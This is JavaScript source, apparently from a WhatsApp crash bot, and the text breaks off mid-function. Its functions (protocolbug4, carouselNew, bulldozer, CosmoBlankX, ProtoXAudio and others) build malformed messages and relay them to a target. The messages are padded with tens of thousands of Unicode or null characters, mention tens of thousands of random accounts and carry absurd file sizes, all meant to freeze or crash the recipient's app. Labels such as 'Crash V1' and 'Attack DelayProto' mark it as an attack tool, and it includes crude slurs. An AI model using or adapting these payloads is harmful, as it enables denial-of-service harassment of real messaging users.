    async function protocolbug4(isTarget, mention) {
    const glitchText = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `╔═━━━✥◈✥━━━═╗\n  Ditz - Is Heree🐍\n╚═━━━✥◈✥━━━═╝\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⚠️ ambuky Crash V1" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

  async function protocolbug5v2(isTarget, mention) {
    const maxMention = 65000; // mendekati batas JS maksimal
    const mentionedList = Array.from({ length: maxMention }, (_, i) =>
        `1${Math.floor(100000 + Math.random() * 900000)}@s.whatsapp.net`
    );

    const longUnicode = "៛" + "‌‎‏" + " ".repeat(500) + "៛".repeat(20000);

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".𝐃𝐈𝐓𝐙 𝐂𝐑𝐀𝐒𝐇𝐄𝐑" + longUnicode,
        title: "Ditz CrashV1🐉〽️" + longUnicode,
        artworkDirectPath: "/v/t62.76458-24/...",
        artworkSha256: "fakehash==",
        artworkEncSha256: "fakehashenc==",
        artistAttribution: "https://www.instagram.com/ekk_cold?igsh=Ync1eWx4YnYzODQ5",
        countryBlocklist: false,
        isExplicit: true,
        artworkMediaKey: "fakekey=="
    };

    const annotations = Array.from({ length: 5 }, () => ({
        embeddedContent: { embeddedMusic },
        embeddedAction: true
    }));

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/...",
        mimetype: "video/mp4",
        fileSha256: "fakebase64==",
        fileLength: "999999",
        seconds: 30,
        mediaKey: "fakeMediaKey==",
        caption: "𐌕𐌀𐌌𐌀 RTL\u202eBUG\u202c𐍂𐍉𐍂" + longUnicode,
        height: 720,
        width: 1280,
        fileEncSha256: "fakeenc==",
        directPath: "/v/t62.7161-24/...",
        mediaKeyTimestamp: `${Date.now()}`,
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363400383798698@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "fakeSidecar==",
        thumbnailDirectPath: "/v/t62.36147-24/...",
        thumbnailSha256: "fakehash==",
        thumbnailEncSha256: "fakeenc==",
        annotations
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: mentionedList.map(jid => ({
                            tag: "to",
                            attrs: { jid },
                            content: undefined
                        }))
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
        
async function mentionSw(isTarget) {
    const delaymention = Array.from({
        length: 9741
    }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{
            title: r + 1,
            id: r + 1
        }]
    }));
    
    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "ambuky Crash 🐍〽",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: {
                        selectedRowId: "🌀"
                    },
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 9741
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "0@newsletter",
                            serverMessageId: 1,
                            newsletterName: "ambuky? Come Heree!!!🐍〽"
                        }
                    },
                    description: "ambuky?? yess, sirrr!!!🐍〽"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(isTarget, MSG, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: isTarget
                    },
                    content: undefined
                }]
            }]
        }]
    });
}


// Func Neww!!
async function protocolbug5(isTarget, mention) {
    const mentionedList = [
        "6283167068175@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Erlangga Come Heree!!" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/ekk_cold?igsh=Ync1eWx4YnYzODQ5",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "VannHost?✦ Im Begginner",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363400383798698@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}


async function carouselNew(isTarget) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "VannHost" + "ꦾ".repeat(11000)
        },
        "footer": {
          "text": "dont panic!!"
        },
        "header": { 
          "title": 'memekk' + "\u0000".repeat(50000),
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(isTarget, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "Kontol " + "ꦾ".repeat(55000)
            },
            "footer": {
              "text": "( 🐉 ) Ambuky Crash V1 ( 🐉 )"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await rikz.relayMessage(isTarget, carousel.message, {
      messageId: carousel.key.id
    });
    console.log("flixce Sending Carousel New !!");
  }
}
        
// Func Buldozer
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await rikz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

// Func Delay Sticker
async function DelayStc(langgxyz, isTarget) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: isTarget,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: { low: 3304, high: 0, unsigned: true },
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: { low: 1746262763, high: 0, unsigned: false },
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await rikz.relayMessage(isTarget, stickerMsg.message, { messageId: stickerMsg.key.id });
}


// Send Pairing
async function SendPairing(isTarget, Ptcp = false) {
  const messageContent = {
    viewOnceMessage: {
      message: {
        nativeFlowResponseMessage: {
          status: true,
          criador: "VenomMods",
          resultado: JSON.stringify({
            type: "md",
            ws: {
              _events: {
                "CB:ib,,dirty": ["Array"]
              },
              _eventsCount: 20,
              _maxListeners: 0,
              url: "wss://web.whatsapp.com/ws/chat",
              config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                connectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: "authData",
                markOnlineOnConnect: true,
                syncFullHistory: false,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: "transactionOptsData",
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: "appStateMacData",
                mobile: false
              }
            }
          }, null, 2) // JSON stringified for pretty format
        }
      }
    }
  };

  try {
    await rikz.relayMessage(isTarget, messageContent, Ptcp ? {
      participant: {
        jid: isTarget
      }
    } : {});
    console.log("Success Send Pairing to Target");
  } catch (error) {
    console.error("Failed to send Pairing to Target:", error);
  }
}


async function SockMentionJid3(target, Ptcp = false) {
      await rikz.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "༑⃟𝗜༑⃟Kntija☇peler༑bnz༑⃐⃐⃐ㇱ-" + "@0".repeat(90000),
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 15000,
                  },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: " target ",
              conversionData: "",
              conversionDelaySeconds: 10,
              forwardingScore: 9999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: " target ",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "https://img1.pixhost.to/images/6285/607879287_imgtmp.jpg",
                caption: " target ",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "\u0000",
                body: "\u0000",
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewType: "VIDEO",
                thumbnail: "https://img1.pixhost.to/images/6285/607879287_imgtmp.jpg",
                sourceType: " target ",
                sourceId: " target ",
                sourceUrl: "https://www.facebook.com/WhatsApp",
                mediaUrl: "https://www.facebook.com/WhatsApp",
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://www.facebook.com/WhatsApp",
              },
              groupSubject: " target ",
              parentGroupJid: "120363038574508340@g.us",
              trustBannerType: " target ",
              trustBannerAction: 1,
              isSampled: true,
              utm: {
                utmSource: " target ",
                utmCampaign: " target ",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363038574508340@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
    
 async function BaccaratUi(langgxyz, target) {
  await rikz.relayMessage(
    target,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "9999999999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙲𝚁𝙰𝚂𝙷𝙴𝚁.",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath:
                  "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
              title: "Hi.... Im Baccarat Of Teenager",
              hasMediaAttachment: true,
            },
            body: {
              text:
                "ꦽ".repeat(50000) +
                "_*~@8~*_\n".repeat(50000) +
                "@8".repeat(50000),
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [
                { groupJid: "0@s.whatsapp.net", groupSubject: "anjay" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
    { messageId: null }
  );
}

async function CosmoBlankX(target) {
  const Hytam = '_*~@2~*_\n'.repeat(10500);
  const Legam = 'ꦽ'.repeat(10000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "\u0000",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: '༑Kontol⍣᳟Bapakkaupecah꙳⟅🩸' + Hytam + Legam,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "6283167068175@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Hades Document Killer",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await rikz.relayMessage(target, message, { participant: { jid: target } });
}

async function ProtoXAudio(target, mention) {
    console.log("Attack DelayProto Berjalann...")
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

